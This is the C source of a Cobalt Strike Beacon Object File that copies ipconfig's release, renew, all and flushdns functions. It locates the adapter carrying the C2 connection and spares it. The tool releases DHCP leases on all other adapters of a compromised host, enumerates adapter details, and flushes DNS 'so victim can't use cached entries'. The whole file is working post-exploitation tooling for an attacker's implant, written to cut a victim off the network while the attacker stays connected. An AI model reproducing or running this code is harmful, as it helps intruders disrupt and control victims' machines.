/*
 * bof_dhcp.c — ipconfig-equivalent BOF for Cobalt Strike 4.x  (x64)
 *
 * Covers all useful ipconfig subcommands:
 *   Action 0  dhcp-off    ipconfig /release  — DHCP release, all non-C2 adapters
 *   Action 1  dhcp-on     ipconfig /renew    — DHCP renew,   all non-C2 adapters
 *   Action 2  dhcp-check  ipconfig /all      — full adapter info (IP, mask, GW,
 *                                              MAC, DHCP, DNS)
 *   Action 3  dhcp-flush  ipconfig /flushdns — flush local DNS resolver cache
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -o dhcp.x64.obj -c bof_dhcp.c \
 *       -masm=intel -Wall -fno-asynchronous-unwind-tables -I.
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include "beacon.h"

/* ═══════════════════════════════════════════════════════════════════════════
 * IMPORTS
 * ═══════════════════════════════════════════════════════════════════════════ */

/* iphlpapi.dll */
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetBestInterface(IPAddr, PDWORD);
DECLSPEC_IMPORT ULONG WINAPI IPHLPAPI$GetAdaptersAddresses(ULONG, ULONG, PVOID,
    PIP_ADAPTER_ADDRESSES, PULONG);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetAdaptersInfo(PIP_ADAPTER_INFO, PULONG);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetInterfaceInfo(PIP_INTERFACE_INFO, PULONG);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$IpReleaseAddress(PIP_ADAPTER_INDEX_MAP);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$IpRenewAddress(PIP_ADAPTER_INDEX_MAP);

/* dnsapi.dll  — for /flushdns */
DECLSPEC_IMPORT BOOL  WINAPI DNSAPI$DnsFlushResolverCache(VOID);

/* kernel32.dll */
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

/* ═══════════════════════════════════════════════════════════════════════════
 * HELPERS
 * ═══════════════════════════════════════════════════════════════════════════ */

#define HALLOC(n) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (n))
#define HFREE(p)  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))

static BOOL str_ieq(const char *a, const char *b) {
    while (*a && *b) {
        char ca = (*a >= 'a' && *a <= 'z') ? (char)(*a - 32) : *a;
        char cb = (*b >= 'a' && *b <= 'z') ? (char)(*b - 32) : *b;
        if (ca != cb) return FALSE;
        a++; b++;
    }
    return (*a == '\0' && *b == '\0');
}

static BOOL str_has(const char *hay, const char *needle) {
    if (!needle || !*needle) return TRUE;
    for (; *hay; hay++) {
        const char *h = hay, *n = needle;
        while (*h && *n && *h == *n) { h++; n++; }
        if (!*n) return TRUE;
    }
    return FALSE;
}

static void wchar_to_char(const WCHAR *src, char *dst, int dstLen) {
    int i = 0;
    while (src[i] && i < dstLen - 1) { dst[i] = (char)src[i]; i++; }
    dst[i] = '\0';
}

static DWORD parse_ipv4(const char *s) {
    DWORD r = 0; BYTE *b = (BYTE *)&r;
    for (int i = 0; i < 4; i++) {
        DWORD v = 0;
        while (*s >= '0' && *s <= '9') { v = v * 10 + (BYTE)(*s - '0'); s++; }
        if (i < 3 && *s == '.') s++;
        b[i] = (BYTE)v;
    }
    return r;
}

static void fmt_ipv4(const BYTE *b, char *buf) {
    int pos = 0;
    for (int i = 0; i < 4; i++) {
        if (i > 0) buf[pos++] = '.';
        BYTE v = b[i];
        if (v >= 100) { buf[pos++] = (char)('0' + v / 100); v = (BYTE)(v % 100); }
        if (v >= 10)  { buf[pos++] = (char)('0' + v / 10);  v = (BYTE)(v % 10);  }
        buf[pos++] = (char)('0' + v);
    }
    buf[pos] = '\0';
}

/* Format MAC address bytes → "XX-XX-XX-XX-XX-XX" */
static void fmt_mac(const BYTE *addr, UINT len, char *out) {
    static const char hx[] = "0123456789ABCDEF";
    int p = 0;
    for (UINT i = 0; i < len && i < 6; i++) {
        if (i > 0) out[p++] = '-';
        out[p++] = hx[(addr[i] >> 4) & 0xF];
        out[p++] = hx[ addr[i]       & 0xF];
    }
    out[p] = '\0';
}

/* TRUE if IP string is "0.0.0.0" or empty */
static BOOL ip_empty(const char *ip) {
    return (!ip[0] || (ip[0]=='0' && ip[1]=='.'));
}

/* ─── Get C2 adapter GUID via GetBestInterface + GetAdaptersAddresses ─── */
static BOOL get_c2_guid(const char *c2ip, char *guidOut, DWORD guidLen) {
    DWORD addr = parse_ipv4(c2ip);
    if (!addr) return FALSE;
    DWORD ifIdx = 0;
    if (IPHLPAPI$GetBestInterface(addr, &ifIdx) != NO_ERROR) return FALSE;

    ULONG len = 0;
    IPHLPAPI$GetAdaptersAddresses(AF_UNSPEC,
        GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER,
        NULL, NULL, &len);
    if (!len) return FALSE;

    PIP_ADAPTER_ADDRESSES pA = (PIP_ADAPTER_ADDRESSES)HALLOC(len);
    if (!pA) return FALSE;
    BOOL found = FALSE;
    if (IPHLPAPI$GetAdaptersAddresses(AF_UNSPEC,
            GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER,
            NULL, pA, &len) == NO_ERROR) {
        for (PIP_ADAPTER_ADDRESSES a = pA; a; a = a->Next) {
            if (a->IfIndex == ifIdx) {
                int i = 0;
                while (a->AdapterName[i] && i < (int)guidLen - 1)
                    { guidOut[i] = a->AdapterName[i]; i++; }
                guidOut[i] = '\0';
                found = TRUE; break;
            }
        }
    }
    HFREE(pA);
    return found;
}

/* ─── Load buffers ───────────────────────────────────────────────────── */
static PIP_ADAPTER_INFO load_adapter_info(void) {
    ULONG len = 0;
    IPHLPAPI$GetAdaptersInfo(NULL, &len);
    if (!len) return NULL;
    PIP_ADAPTER_INFO p = (PIP_ADAPTER_INFO)HALLOC(len);
    if (!p) return NULL;
    if (IPHLPAPI$GetAdaptersInfo(p, &len) != NO_ERROR) { HFREE(p); return NULL; }
    return p;
}

static PIP_INTERFACE_INFO load_interface_info(void) {
    ULONG len = 0;
    IPHLPAPI$GetInterfaceInfo(NULL, &len);
    if (!len) return NULL;
    PIP_INTERFACE_INFO p = (PIP_INTERFACE_INFO)HALLOC(len);
    if (!p) return NULL;
    if (IPHLPAPI$GetInterfaceInfo(p, &len) != NO_ERROR) { HFREE(p); return NULL; }
    return p;
}

/* Load GetAdaptersAddresses WITHOUT skipping DNS servers */
static PIP_ADAPTER_ADDRESSES load_adapter_addresses_full(void) {
    ULONG len = 0;
    ULONG flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST;
    IPHLPAPI$GetAdaptersAddresses(AF_UNSPEC, flags, NULL, NULL, &len);
    if (!len) return NULL;
    PIP_ADAPTER_ADDRESSES p = (PIP_ADAPTER_ADDRESSES)HALLOC(len);
    if (!p) return NULL;
    if (IPHLPAPI$GetAdaptersAddresses(AF_UNSPEC, flags, NULL, p, &len) != NO_ERROR)
        { HFREE(p); return NULL; }
    return p;
}

/* Find IP_ADAPTER_INDEX_MAP by GUID substring in wide Name */
static PIP_ADAPTER_INDEX_MAP find_if_map(PIP_INTERFACE_INFO pIf,
                                          const char *guid) {
    char narrow[512];
    for (LONG i = 0; i < pIf->NumAdapters; i++) {
        wchar_to_char(pIf->Adapter[i].Name, narrow, sizeof(narrow));
        if (str_has(narrow, guid)) return &pIf->Adapter[i];
    }
    return NULL;
}

/* Find GetAdaptersAddresses entry by AdapterName (GUID) */
static PIP_ADAPTER_ADDRESSES find_aa_by_guid(PIP_ADAPTER_ADDRESSES pAA,
                                               const char *guid) {
    for (PIP_ADAPTER_ADDRESSES a = pAA; a; a = a->Next)
        if (str_ieq(a->AdapterName, guid)) return a;
    return NULL;
}

static const char *dhcp_err_str(DWORD r) {
    if (r == NO_ERROR)                return "OK";
    if (r == ERROR_INVALID_PARAMETER) return "no DHCP lease (static IP?)";
    if (r == ERROR_NOT_SUPPORTED)     return "not supported";
    return "error";
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ACTION 2: CHECK  —  equivalent to ipconfig /all
 * Shows: adapter name, GUID, MAC, IP/mask, gateway, DHCP info, DNS servers
 * ═══════════════════════════════════════════════════════════════════════════ */

static void action_check(const char *c2Guid) {
    PIP_ADAPTER_INFO      pInfo = load_adapter_info();
    PIP_ADAPTER_ADDRESSES pAA   = load_adapter_addresses_full();

    if (!pInfo) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetAdaptersInfo failed\n");
        if (pAA) HFREE(pAA);
        return;
    }

    for (PIP_ADAPTER_INFO a = pInfo; a; a = a->Next) {
        /* C2 tag */
        char tag[6]; tag[0] = '\0';
        if (str_ieq(a->AdapterName, c2Guid)) {
            tag[0]=' '; tag[1]='['; tag[2]='C'; tag[3]='2'; tag[4]=']'; tag[5]='\0';
        }

        /* Friendly name + MAC from GetAdaptersAddresses */
        char fname[64] = "(unknown)";
        char macStr[20] = "N/A";
        PIP_ADAPTER_ADDRESSES pEntry = pAA ?
            find_aa_by_guid(pAA, a->AdapterName) : NULL;
        if (pEntry) {
            wchar_to_char(pEntry->FriendlyName, fname, sizeof(fname));
            if (pEntry->PhysicalAddressLength > 0)
                fmt_mac(pEntry->PhysicalAddress,
                        pEntry->PhysicalAddressLength, macStr);
        }

        /* Print adapter block header */
        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[%s]%s\n", fname, tag);
        BeaconPrintf(CALLBACK_OUTPUT,
            "  GUID    : %s\n", a->AdapterName);
        BeaconPrintf(CALLBACK_OUTPUT,
            "  Desc    : %s\n", a->Description);
        BeaconPrintf(CALLBACK_OUTPUT,
            "  MAC     : %s\n", macStr);

        /* IP / Subnet mask */
        const char *ip   = a->IpAddressList.IpAddress.String;
        const char *mask = a->IpAddressList.IpMask.String;
        if (ip_empty(ip))
            BeaconPrintf(CALLBACK_OUTPUT, "  IP      : (not assigned)\n");
        else
            BeaconPrintf(CALLBACK_OUTPUT,
                "  IP      : %s  /  %s\n", ip, mask);

        /* Gateway */
        const char *gw = a->GatewayList.IpAddress.String;
        BeaconPrintf(CALLBACK_OUTPUT,
            "  Gateway : %s\n", ip_empty(gw) ? "(none)" : gw);

        /* DHCP */
        if (a->DhcpEnabled) {
            const char *srv = a->DhcpServer.IpAddress.String;
            BeaconPrintf(CALLBACK_OUTPUT,
                "  DHCP    : ENABLED  (server: %s)\n",
                ip_empty(srv) ? "unknown" : srv);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  DHCP    : DISABLED (static IP)\n");
        }

        /* DNS servers — from GetAdaptersAddresses */
        if (pEntry && pEntry->FirstDnsServerAddress) {
            BOOL first = TRUE;
            for (PIP_ADAPTER_DNS_SERVER_ADDRESS dns = pEntry->FirstDnsServerAddress;
                 dns; dns = dns->Next) {
                if (dns->Address.lpSockaddr->sa_family != AF_INET) continue;
                BYTE *s4 = (BYTE*)
                    &((SOCKADDR_IN*)dns->Address.lpSockaddr)->sin_addr;
                char dnsStr[20];
                fmt_ipv4(s4, dnsStr);
                if (first) {
                    BeaconPrintf(CALLBACK_OUTPUT, "  DNS     : %s\n", dnsStr);
                    first = FALSE;
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "            %s\n", dnsStr);
                }
            }
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  DNS     : (none)\n");
        }
    }

    if (pAA)   HFREE(pAA);
    if (pInfo) HFREE(pInfo);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ACTION 0: RELEASE  —  ipconfig /release  (all non-C2 DHCP adapters)
 * ═══════════════════════════════════════════════════════════════════════════ */

static void action_release(const char *c2Guid) {
    PIP_ADAPTER_INFO   pInfo = load_adapter_info();
    PIP_INTERFACE_INFO pIf   = load_interface_info();
    if (!pInfo || !pIf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to load adapter info\n");
        if (pInfo) HFREE(pInfo);
        if (pIf)   HFREE(pIf);
        return;
    }

    for (PIP_ADAPTER_INFO a = pInfo; a; a = a->Next) {
        if (str_ieq(a->AdapterName, c2Guid)) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [C2]  skip    : %s\n", a->Description);
            continue;
        }
        if (!a->DhcpEnabled) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [--]  static  : %s  — no DHCP, skip\n", a->Description);
            continue;
        }
        if (ip_empty(a->IpAddressList.IpAddress.String)) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [--]  no IP   : %s  — nothing to release\n", a->Description);
            continue;
        }

        BeaconPrintf(CALLBACK_OUTPUT,
            "  [>>]  release : %s  (IP=%s)\n",
            a->Description, a->IpAddressList.IpAddress.String);

        PIP_ADAPTER_INDEX_MAP pMap = find_if_map(pIf, a->AdapterName);
        if (!pMap) {
            BeaconPrintf(CALLBACK_ERROR,
                "        [-] not found in InterfaceInfo\n"); continue;
        }
        DWORD r = IPHLPAPI$IpReleaseAddress(pMap);
        if (r == NO_ERROR)
            BeaconPrintf(CALLBACK_OUTPUT, "        [+] RELEASED OK\n");
        else
            BeaconPrintf(CALLBACK_ERROR,
                "        [-] err=%lu  %s\n", r, dhcp_err_str(r));
    }

    /* Verify: re-read adapter info and show state */
    BeaconPrintf(CALLBACK_OUTPUT, "\n  [verify after release]\n");
    PIP_ADAPTER_INFO pV = load_adapter_info();
    if (pV) {
        for (PIP_ADAPTER_INFO a = pV; a; a = a->Next) {
            if (!a->DhcpEnabled) continue;
            if (str_ieq(a->AdapterName, c2Guid)) continue;
            BOOL gone = ip_empty(a->IpAddressList.IpAddress.String);
            BeaconPrintf(CALLBACK_OUTPUT,
                "  %-24s  →  %s\n", a->Description,
                gone ? "(no IP) ✓" : a->IpAddressList.IpAddress.String);
        }
        HFREE(pV);
    }

    HFREE(pIf); HFREE(pInfo);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ACTION 1: RENEW  —  ipconfig /renew  (all non-C2 DHCP adapters)
 * Note: IpRenewAddress blocks until DHCP handshake completes (a few seconds)
 * ═══════════════════════════════════════════════════════════════════════════ */

static void action_renew(const char *c2Guid) {
    PIP_ADAPTER_INFO   pInfo = load_adapter_info();
    PIP_INTERFACE_INFO pIf   = load_interface_info();
    if (!pInfo || !pIf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to load adapter info\n");
        if (pInfo) HFREE(pInfo);
        if (pIf)   HFREE(pIf);
        return;
    }

    for (PIP_ADAPTER_INFO a = pInfo; a; a = a->Next) {
        if (str_ieq(a->AdapterName, c2Guid)) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [C2]  skip    : %s\n", a->Description);
            continue;
        }
        if (!a->DhcpEnabled) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [--]  static  : %s  — no DHCP, skip\n", a->Description);
            continue;
        }

        BeaconPrintf(CALLBACK_OUTPUT,
            "  [>>]  renew   : %s  (current: %s)\n",
            a->Description, ip_empty(a->IpAddressList.IpAddress.String) ?
                "(no IP)" : a->IpAddressList.IpAddress.String);

        PIP_ADAPTER_INDEX_MAP pMap = find_if_map(pIf, a->AdapterName);
        if (!pMap) {
            BeaconPrintf(CALLBACK_ERROR,
                "        [-] not found in InterfaceInfo\n"); continue;
        }
        DWORD r = IPHLPAPI$IpRenewAddress(pMap);
        if (r == NO_ERROR)
            BeaconPrintf(CALLBACK_OUTPUT, "        [+] RENEWED OK\n");
        else
            BeaconPrintf(CALLBACK_ERROR,
                "        [-] err=%lu  %s\n", r, dhcp_err_str(r));
    }

    /* Verify: show new IP after renew */
    BeaconPrintf(CALLBACK_OUTPUT, "\n  [verify after renew]\n");
    PIP_ADAPTER_INFO pV = load_adapter_info();
    if (pV) {
        for (PIP_ADAPTER_INFO a = pV; a; a = a->Next) {
            if (!a->DhcpEnabled) continue;
            if (str_ieq(a->AdapterName, c2Guid)) continue;
            BOOL hasIp = !ip_empty(a->IpAddressList.IpAddress.String);
            BeaconPrintf(CALLBACK_OUTPUT,
                "  %-24s  →  %s%s\n", a->Description,
                hasIp ? a->IpAddressList.IpAddress.String : "(no IP yet)",
                hasIp ? " ✓" : "");
        }
        HFREE(pV);
    }

    HFREE(pIf); HFREE(pInfo);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ACTION 3: FLUSH DNS  —  ipconfig /flushdns
 * Clears the local DNS resolver cache (dnsapi.dll)
 * Useful after network isolation so victim can't use cached entries
 * ═══════════════════════════════════════════════════════════════════════════ */

static void action_flushdns(void) {
    BOOL ok = DNSAPI$DnsFlushResolverCache();
    if (ok)
        BeaconPrintf(CALLBACK_OUTPUT,
            "  [+] DNS resolver cache flushed successfully\n"
            "      (equivalent to: ipconfig /flushdns)\n");
    else
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] DnsFlushResolverCache failed\n"
            "      (may need SYSTEM or higher integrity)\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════ */

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    char *c2ip   = BeaconDataExtract(&parser, NULL);
    int   action = BeaconDataInt(&parser);

    if (!c2ip || c2ip[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: dhcp-check/off/on/flush <C2_IP>\n");
        return;
    }

    /* dhcp-flush (action 3) is system-wide — no adapter identification needed */
    if (action == 3) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] ===== FLUSH DNS  (ipconfig /flushdns) =====\n");
        action_flushdns();
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Done.\n");
        return;
    }

    char c2Guid[64]; c2Guid[0] = '\0';
    if (!get_c2_guid(c2ip, c2Guid, sizeof(c2Guid))) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Cannot identify C2 adapter for %s\n", c2ip);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] C2: %s  |  GUID: %s\n", c2ip, c2Guid);

    switch (action) {
        case 0:
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] ===== DHCP RELEASE  (ipconfig /release) =====\n");
            action_release(c2Guid);
            break;
        case 1:
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] ===== DHCP RENEW  (ipconfig /renew) =====\n");
            action_renew(c2Guid);
            break;
        case 2:
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] ===== ADAPTER INFO  (ipconfig /all) =====\n");
            action_check(c2Guid);
            break;
        case 3:
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] ===== FLUSH DNS  (ipconfig /flushdns) =====\n");
            action_flushdns();
            break;
        default:
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Invalid action %d\n"
                "    0=release  1=renew  2=check(ipconfig/all)  3=flushdns\n",
                action);
            return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Done.\n");
}
